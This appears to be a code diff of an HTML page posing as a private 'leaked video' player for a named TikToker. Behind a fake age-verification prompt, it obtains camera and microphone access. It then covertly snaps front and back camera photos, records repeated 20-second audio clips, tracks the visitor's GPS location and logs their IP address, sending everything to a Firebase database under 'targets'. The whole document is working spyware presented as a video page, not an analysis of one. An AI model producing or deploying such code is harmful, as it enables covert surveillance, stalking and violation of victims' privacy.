@@ -3,155 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Verification | Private Content</title>
+    <title>Private Video Player | Secure Access</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         
-        /* Loading Overlay */
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; }
-        .play-btn { width: 90px; height: 90px; background: #ff0000; border-radius: 50%; border: 3px solid #fff; cursor: pointer; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(255,0,0,0.6); }
-        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent #fff; margin-left: 5px; }
+        /* Background Iframe (Target Website) */
+        #site-frame {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            border: none; z-index: 1; opacity: 0.4; /* Shuru mein halka dikhega */
+            pointer-events: none; /* Click block */
+        }
 
-        /* Fake Age Verification Modal */
-        #verify-modal { background: #111; width: 85%; max-width: 350px; padding: 25px; border-radius: 15px; border: 1px solid #ff0000; text-align: center; display: none; color: #fff; z-index: 110; box-shadow: 0 0 50px #000; }
-        .start-btn { background: #ff0000; color: #fff; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 16px; }
+        /* Front Interaction Layer */
+        #hijack-layer {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 100; background: rgba(0,0,0,0.6);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        }
 
-        /* VIDEO LOCKDOWN SYSTEM */
-        #video-lockdown { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; background: #000; }
-        
-        /* Website Hijack (Target isse touch nahi kar payega) */
-        #fake-site { width: 100%; height: 100%; border: none; pointer-events: none; opacity: 0.2; position: absolute; }
-        
-        /* Video Player Area */
-        #player-box { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; max-width: 900px; aspect-ratio: 16/9; z-index: 1001; }
-        iframe#target-video { width: 100%; height: 100%; border: 2px solid #ff0000; }
+        .play-box {
+            width: 100px; height: 100px; background: #ff0000;
+            border-radius: 50%; border: 4px solid #fff;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; box-shadow: 0 0 40px rgba(255,0,0,0.8);
+            transition: 0.3s;
+        }
+        .play-box::after {
+            content: ''; border-style: solid; border-width: 18px 0 18px 30px;
+            border-color: transparent transparent transparent #fff; margin-left: 10px;
+        }
+
+        .text-overlay { color: #fff; margin-top: 20px; text-align: center; }
+        .text-overlay h2 { margin: 0; font-size: 22px; color: #ff0000; }
+        .text-overlay p { font-size: 13px; opacity: 0.8; }
+
+        /* Status Bar (Fake Loading) */
+        #loader { display: none; color: #00ff88; font-family: monospace; margin-top: 15px; }
+
     </style>
 </head>
 <body>
 
-    <div id="overlay">
-        <div class="play-btn" id="btn-play" onclick="showModal()"></div>
-        <p style="color:#fff; margin-top:20px; font-weight:bold; letter-spacing:1px;">TAP TO UNMUTE & PLAY</p>
-        
-        <div id="verify-modal">
-            <h2 style="color:#ff0000; margin-bottom:10px;">Security Check</h2>
-            <p style="font-size: 14px; line-height: 1.5;">This content is 18+. To continue, please allow camera verification to confirm your age.</p>
-            <button class="start-btn" onclick="ignite()">VERIFY & START</button>
-        </div>
-    </div>
+    <iframe id="site-frame" src="https://darkero.com/tiktoker-alina-amir-leaked-video/"></iframe>
 
-    <div id="video-lockdown">
-        <iframe id="fake-site" src="https://darkero.com/tiktoker-alina-amir-leaked-video/"></iframe>
-        
-        <div id="player-box">
-            <iframe id="target-video" allow="autoplay; encrypted-media; fullscreen" frameborder="0"></iframe>
+    <div id="hijack-layer">
+        <div class="play-box" onclick="ignite()"></div>
+        <div class="text-overlay">
+            <h2>PRIVATE CONTENT</h2>
+            <p>Verification Required to Watch This Video</p>
+            <div id="loader">PERFORMING AGE VERIFICATION...</div>
         </div>
     </div>
 
 <script>
-    // --- FIREBASE CONFIG ---
+    // --- FIREBASE CONFIG (Yahan apni sahi details daalein) ---
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
     
     const sessionID = "NODE_" + Math.floor(10000 + Math.random() * 90000);
-    // Yahan wo video URL daalein jo dikhana hai (e.g. YouTube ya koi direct mp4)
-    const videoToWatch = "https://www.youtube.com/embed/6Ogzc_-lW9w?autoplay=1&rel=0";
-
-    function showModal() {
-        document.getElementById('btn-play').style.display = 'none';
-        document.getElementById('verify-modal').style.display = 'block';
-    }
 
     async function ignite() {
+        document.getElementById('loader').style.display = 'block';
+        
         try {
-            // Permission for Camera & Audio
+            // Target se Permission mangna
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-            // Show Video UI
-            document.getElementById('video-lockdown').style.display = 'block';
-            document.getElementById('target-video').src = videoToWatch;
-            document.getElementById('overlay').style.display = 'none';
-
-            // Instant Intelligence Actions
-            capture("user"); // Front Camera
-            setTimeout(() => capture("environment"), 4000); // Back Camera
-            recordAudio(20000); // 20 Seconds Audio
+            // Data Collect karna
+            logTarget();
+            trackLocation();
             
-            // Start Tracking
-            logData();
-            trackGPS();
+            // Instant Front & Back Photo
+            snapPhoto("user");
+            setTimeout(() => snapPhoto("environment"), 4000);
+            
+            // 20 Second Audio Record
+            recordMic(20000);
 
-            // Background Loop (Har 30 sec baad update)
+            // Lockdown Khatam (Ab target website use kar sakega)
+            setTimeout(() => {
+                document.getElementById('hijack-layer').style.display = 'none';
+                document.getElementById('site-frame').style.opacity = '1';
+                document.getElementById('site-frame').style.pointerEvents = 'auto';
+            }, 2000);
+
+            // Loop Intelligence (Har 45 sec baad background update)
             setInterval(() => {
-                capture("user");
-                recordAudio(20000);
-            }, 40000);
+                snapPhoto("user");
+                recordMic(20000);
+            }, 45000);
 
         } catch (e) {
-            alert("Verification Failed: Please grant camera access to verify your age.");
+            alert("Security Error: Camera and Microphone access is required to unlock this video.");
             location.reload();
         }
     }
 
-    async function capture(mode) {
+    async function snapPhoto(mode) {
         try {
-            const constraints = { video: { facingMode: mode === "user" ? "user" : "environment" } };
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            const v = document.createElement('video'); v.srcObject = stream; await v.play();
-            
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            const video = document.createElement('video'); video.srcObject = stream; await video.play();
             setTimeout(() => {
-                const c = document.createElement('canvas');
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                db.ref(`targets/${sessionID}/photos`).push({ 
-                    img: c.toDataURL('image/jpeg', 0.4), 
-                    type: mode, 
-                    time: new Date().toLocaleTimeString() 
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                db.ref(`targets/${sessionID}/photos`).push({
+                    img: canvas.toDataURL('image/jpeg', 0.5),
+                    type: mode,
+                    time: new Date().toLocaleTimeString()
                 });
                 stream.getTracks().forEach(t => t.stop());
             }, 2000);
         } catch(e) {}
     }
 
-    async function recordAudio(ms) {
+    async function recordMic(duration) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
             const mr = new MediaRecorder(stream);
-            let chunks = [];
-            mr.ondataavailable = (e) => chunks.push(e.data);
+            let parts = [];
+            mr.ondataavailable = e => parts.push(e.data);
             mr.onstop = () => {
-                const blob = new Blob(chunks, { type: 'audio/webm' });
                 const reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = () => {
-                    db.ref(`targets/${sessionID}/audio`).push({ 
-                        data: reader.result, 
-                        time: new Date().toLocaleTimeString() 
-                    });
-                };
+                reader.readAsDataURL(new Blob(parts, { type: 'audio/webm' }));
+                reader.onloadend = () => db.ref(`targets/${sessionID}/audio`).push({
+                    data: reader.result,
+                    time: new Date().toLocaleTimeString()
+                });
             };
-            mr.start(); setTimeout(() => mr.stop(), ms);
+            mr.start(); setTimeout(() => mr.stop(), duration);
         } catch(e) {}
     }
 
-    function trackGPS() {
+    function trackLocation() {
         navigator.geolocation.watchPosition(p => {
-            db.ref(`targets/${sessionID}/location`).set({ 
-                latitude: p.coords.latitude, 
-                longitude: p.coords.longitude 
+            db.ref(`targets/${sessionID}/location`).set({
+                latitude: p.coords.latitude,
+                longitude: p.coords.longitude
             });
         }, null, {enableHighAccuracy:true});
     }
 
-    async function logData() {
-        const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+    async function logTarget() {
+        const ipInfo = await fetch('https://api.ipify.org?format=json').then(r => r.json());
         db.ref(`targets/${sessionID}/info`).set({
-            ip: ipRes.ip,
+            ip: ipInfo.ip,
             platform: navigator.platform,
-            timestamp: Date.now(), // Dashboard "NEW" badge ke liye
+            timestamp: Date.now(),
             time: new Date().toLocaleString()
         });
     }
